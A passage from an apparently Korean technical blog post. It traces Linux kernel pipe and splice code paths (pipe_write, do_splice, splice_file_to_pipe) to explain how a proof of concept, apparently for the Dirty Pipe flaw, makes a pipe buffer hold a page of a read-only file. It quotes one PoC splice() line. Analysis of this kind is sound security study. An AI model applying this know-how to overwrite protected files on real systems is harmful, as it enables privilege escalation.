				<span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="n">PIPE_BUF_FLAG_PACKET</span><span class="p">;</span>
			<span class="k">else</span>
				<span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">;</span>
			<span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

			<span class="n">copied</span> <span class="o">=</span> <span class="n">copy_page_from_iter</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">copied</span> <span class="o">&lt;</span> <span class="n">PAGE_SIZE</span> <span class="o">&amp;&amp;</span> <span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">)))</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
					<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
<span class="p">...</span>
</code></pre></div></div>

<p>pipe에 데이터를 write하면 pipe_write 함수가 호출된다.(create_pipe_files, pipefifo_fops 참고해주세요.) pipe_write 함수는 새로운 page를 할당해서 struct pipe_buffer 오브젝트에 넣고, copy_page_from_iter 함수에서 page를 맵핑하고 우리가 전달한 데이터를 쓴다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe_empty</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">tail</span><span class="p">))</span> <span class="p">{</span>
			<span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">tail</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>
			<span class="kt">size_t</span> <span class="n">chars</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>
			<span class="kt">size_t</span> <span class="n">written</span><span class="p">;</span>
			<span class="kt">int</span> <span class="n">error</span><span class="p">;</span>

			<span class="k">if</span> <span class="p">(</span><span class="n">chars</span> <span class="o">&gt;</span> <span class="n">total_len</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PIPE_BUF_FLAG_WHOLE</span><span class="p">)</span> <span class="p">{</span>
					<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
						<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOBUFS</span><span class="p">;</span>
					<span class="k">break</span><span class="p">;</span>
				<span class="p">}</span>
				<span class="n">chars</span> <span class="o">=</span> <span class="n">total_len</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="n">error</span> <span class="o">=</span> <span class="n">pipe_buf_confirm</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
					<span class="n">ret</span> <span class="o">=</span> <span class="n">error</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="n">written</span> <span class="o">=</span> <span class="n">copy_page_to_iter</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">,</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span> <span class="n">chars</span><span class="p">,</span> <span class="n">to</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">written</span> <span class="o">&lt;</span> <span class="n">chars</span><span class="p">))</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
					<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
</code></pre></div></div>

<p>pipe를 read하면, pipe_read 함수가 호출되는데, pipe_write 함수에서 할당한 page로부터 데이터를 읽어온다.</p>

<p>정리해보자면, pipe는 커널에서 만든 페이지에 데이터를 쓰고 읽으며 동작한다.</p>

<p>다음으로 splice 함수를 봐보자.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">splice</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd_in</span><span class="p">,</span> <span class="n">off64_t</span> <span class="o">*</span><span class="n">off_in</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fd_out</span><span class="p">,</span> <span class="n">off64_t</span> <span class="o">*</span><span class="n">off_out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">);</span>
</code></pre></div></div>

<p>splice 함수는 두개의 파일 디스크립터를 받아서 데이터를 복사해주는 함수이고, 위 프로토타입과 같이 fd_in에 전달한 파일 디스크립터의 내용을 fd_out로 len만큼 데이터를 복사한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="n">nbytes</span> <span class="o">=</span> <span class="n">splice</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div></div>

<p>PoC에서 splice 함수를 호출 할 때 fd_in에 write하고 싶은 파일 디스크립터(읽기만 가능한)를 전달하고, fd_out에 pipe 파일 디스크립터를 전달한다. 커널에서 splice 함수가 어떻게 데이터를 복사하게 되는지, 이 과정에서 buf→page에 추후 읽게 되는 파일의 page가 들어가게 되는지 간단하게 봐보자.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SYSCALL_DEFINE6</span><span class="p">(</span><span class="n">splice</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="n">fd_in</span><span class="p">,</span> <span class="n">loff_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">off_in</span><span class="p">,</span>
		<span class="kt">int</span><span class="p">,</span> <span class="n">fd_out</span><span class="p">,</span> <span class="n">loff_t</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">off_out</span><span class="p">,</span>
		<span class="kt">size_t</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span><span class="p">,</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">fd</span> <span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">error</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">len</span><span class="p">))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">SPLICE_F_ALL</span><span class="p">))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

	<span class="n">error</span> <span class="o">=</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>
	<span class="n">in</span> <span class="o">=</span> <span class="n">fdget</span><span class="p">(</span><span class="n">fd_in</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">in</span><span class="p">.</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">out</span> <span class="o">=</span> <span class="n">fdget</span><span class="p">(</span><span class="n">fd_out</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">out</span><span class="p">.</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">error</span> <span class="o">=</span> <span class="n">__do_splice</span><span class="p">(</span><span class="n">in</span><span class="p">.</span><span class="n">file</span><span class="p">,</span> <span class="n">off_in</span><span class="p">,</span> <span class="n">out</span><span class="p">.</span><span class="n">file</span><span class="p">,</span> <span class="n">off_out</span><span class="p">,</span>
						<span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
			<span class="n">fdput</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="n">fdput</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="n">error</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>splice 함수에 전달 된 2개의 파일 디스크립터로 file 오브젝트를 구하고 __do_splice 함수로 전달한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">long</span> <span class="nf">__do_splice</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="n">loff_t</span> <span class="n">__user</span> <span class="o">*</span><span class="n">off_in</span><span class="p">,</span>
			<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="n">loff_t</span> <span class="n">__user</span> <span class="o">*</span><span class="n">off_out</span><span class="p">,</span>
			<span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">ipipe</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">opipe</span><span class="p">;</span>
	<span class="n">loff_t</span> <span class="n">offset</span><span class="p">,</span> <span class="o">*</span><span class="n">__off_in</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span><span class="n">__off_out</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>

	<span class="n">ipipe</span> <span class="o">=</span> <span class="n">get_pipe_info</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
	<span class="n">opipe</span> <span class="o">=</span> <span class="n">get_pipe_info</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">ipipe</span> <span class="o">&amp;&amp;</span> <span class="n">off_in</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ESPIPE</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">opipe</span> <span class="o">&amp;&amp;</span> <span class="n">off_out</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ESPIPE</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">off_out</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">off_out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">loff_t</span><span class="p">)))</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
		<span class="n">__off_out</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">off_in</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">off_in</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">loff_t</span><span class="p">)))</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
		<span class="n">__off_in</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">do_splice</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="n">__off_in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">__off_out</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">__off_out</span> <span class="o">&amp;&amp;</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">off_out</span><span class="p">,</span> <span class="n">__off_out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">loff_t</span><span class="p">)))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">__off_in</span> <span class="o">&amp;&amp;</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">off_in</span><span class="p">,</span> <span class="n">__off_in</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">loff_t</span><span class="p">)))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>

	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>전달 된 file 오브젝트로부터 pipe_inode_info를 구해와서 기타 인자와 함께 검증하고 _splice 함수를 호출한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">long</span> <span class="nf">do_splice</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off_in</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span>
	       <span class="n">loff_t</span> <span class="o">*</span><span class="n">off_out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">ipipe</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">opipe</span><span class="p">;</span>
	<span class="n">loff_t</span> <span class="n">offset</span><span class="p">;</span>
	<span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">in</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_READ</span><span class="p">)</span> <span class="o">||</span>
		     <span class="o">!</span><span class="p">(</span><span class="n">out</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_WRITE</span><span class="p">)))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>

	<span class="n">ipipe</span> <span class="o">=</span> <span class="n">get_pipe_info</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
	<span class="n">opipe</span> <span class="o">=</span> <span class="n">get_pipe_info</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">ipipe</span> <span class="o">&amp;&amp;</span> <span class="n">opipe</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">off_in</span> <span class="o">||</span> <span class="n">off_out</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">ESPIPE</span><span class="p">;</span>

		<span class="cm">/* Splicing to self would be fun, but... */</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ipipe</span> <span class="o">==</span> <span class="n">opipe</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

		<span class="k">if</span> <span class="p">((</span><span class="n">in</span><span class="o">-&gt;</span><span class="n">f_flags</span> <span class="o">|</span> <span class="n">out</span><span class="o">-&gt;</span><span class="n">f_flags</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">O_NONBLOCK</span><span class="p">)</span>
			<span class="n">flags</span> <span class="o">|=</span> <span class="n">SPLICE_F_NONBLOCK</span><span class="p">;</span>

		<span class="k">return</span> <span class="n">splice_pipe_to_pipe</span><span class="p">(</span><span class="n">ipipe</span><span class="p">,</span> <span class="n">opipe</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">ipipe</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">off_in</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">ESPIPE</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">off_out</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">out</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_PWRITE</span><span class="p">))</span>
				<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
			<span class="n">offset</span> <span class="o">=</span> <span class="o">*</span><span class="n">off_out</span><span class="p">;</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="n">offset</span> <span class="o">=</span> <span class="n">out</span><span class="o">-&gt;</span><span class="n">f_pos</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">out</span><span class="o">-&gt;</span><span class="n">f_flags</span> <span class="o">&amp;</span> <span class="n">O_APPEND</span><span class="p">))</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

		<span class="n">ret</span> <span class="o">=</span> <span class="n">rw_verify_area</span><span class="p">(</span><span class="n">WRITE</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">))</span>
			<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">in</span><span class="o">-&gt;</span><span class="n">f_flags</span> <span class="o">&amp;</span> <span class="n">O_NONBLOCK</span><span class="p">)</span>
			<span class="n">flags</span> <span class="o">|=</span> <span class="n">SPLICE_F_NONBLOCK</span><span class="p">;</span>

		<span class="n">file_start_write</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">do_splice_from</span><span class="p">(</span><span class="n">ipipe</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
		<span class="n">file_end_write</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">off_out</span><span class="p">)</span>
			<span class="n">out</span><span class="o">-&gt;</span><span class="n">f_pos</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
		<span class="k">else</span>
			<span class="o">*</span><span class="n">off_out</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>

		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">opipe</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">off_out</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">ESPIPE</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">off_in</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">in</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_PREAD</span><span class="p">))</span>
				<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
			<span class="n">offset</span> <span class="o">=</span> <span class="o">*</span><span class="n">off_in</span><span class="p">;</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="n">offset</span> <span class="o">=</span> <span class="n">in</span><span class="o">-&gt;</span><span class="n">f_pos</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">out</span><span class="o">-&gt;</span><span class="n">f_flags</span> <span class="o">&amp;</span> <span class="n">O_NONBLOCK</span><span class="p">)</span>
			<span class="n">flags</span> <span class="o">|=</span> <span class="n">SPLICE_F_NONBLOCK</span><span class="p">;</span>

		<span class="n">ret</span> <span class="o">=</span> <span class="n">splice_file_to_pipe</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="n">opipe</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">off_in</span><span class="p">)</span>
			<span class="n">in</span><span class="o">-&gt;</span><span class="n">f_pos</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>
		<span class="k">else</span>
			<span class="o">*</span><span class="n">off_in</span> <span class="o">=</span> <span class="n">offset</span><span class="p">;</span>

		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>파일 디스크립터에 대한 여러가지 검사 후, 타입에 따라 하위 함수를 호출하게 되는데, PoC 코드에서 fd_in을 pipe 파일 디스크립터가 아닌 것으로, fd_out을 pipe 파일 디스크립터로 전달했기 때문에 splice_file_to_pipe 함수가 호출 된다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">long</span> <span class="nf">splice_file_to_pipe</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span>
			 <span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">opipe</span><span class="p">,</span>
			 <span class="n">loff_t</span> <span class="o">*</span><span class="n">offset</span><span class="p">,</span>
			 <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>

	<span class="n">pipe_lock</span><span class="p">(</span><span class="n">opipe</span><span class="p">);</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="n">wait_for_space</span><span class="p">(</span><span class="n">opipe</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">do_splice_to</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">opipe</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
	<span class="n">pipe_unlock</span><span class="p">(</span><span class="n">opipe</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">wakeup_pipe_readers</span><span class="p">(</span><span class="n">opipe</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>splice_file_to_pipe 함수는 pipe_inode_info 오브젝트에 대한 검사와 do_splice_to 함수를 호출한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">long</span> <span class="nf">do_splice_to</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">,</span>
			 <span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">pipe</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span>
			 <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">p_space</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">in</span><span class="o">-&gt;</span><span class="n">f_mode</span> <span class="o">&amp;</span> <span class="n">FMODE_READ</span><span class="p">)))</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EBADF</span><span class="p">;</span>

	<span class="cm">/* Don't try to read more the pipe has space for. */</span>
	<span class="n">p_space</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span> <span class="o">-</span> <span class="n">pipe_occupancy</span><span class="p">(</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">);</span>
	<span class="n">len</span> <span class="o">=</span> <span class="n">min_t</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">p_space</span> <span class="o">&lt;&lt;</span> <span class="n">PAGE_SHIFT</span><span class="p">);</span>

	<span class="n">ret</span> <span class="o">=</span> <span class="n">rw_verify_area</span><span class="p">(</span><span class="n">READ</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="n">ppos</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="n">MAX_RW_COUNT</span><span class="p">))</span>
		<span class="n">len</span> <span class="o">=</span> <span class="n">MAX_RW_COUNT</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">in</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">splice_read</span><span class="p">))</span>
		<span class="k">return</span> <span class="n">warn_unsupported</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="s">"read"</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">in</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">splice_read</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="n">ppos</span><span class="p">,</span> <span class="n">pipe</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>또 다른 검사와 fd_in으로 전달 한 파일 디스크립터 fops에 등록된 splice_read함수를 실행한다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">generic_file_splice_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">ppos</span><span class="p">,</span>
				 <span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">pipe</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span>
				 <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">iov_iter</span> <span class="n">to</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">kiocb</span> <span class="n">kiocb</span><span class="p">;</span>
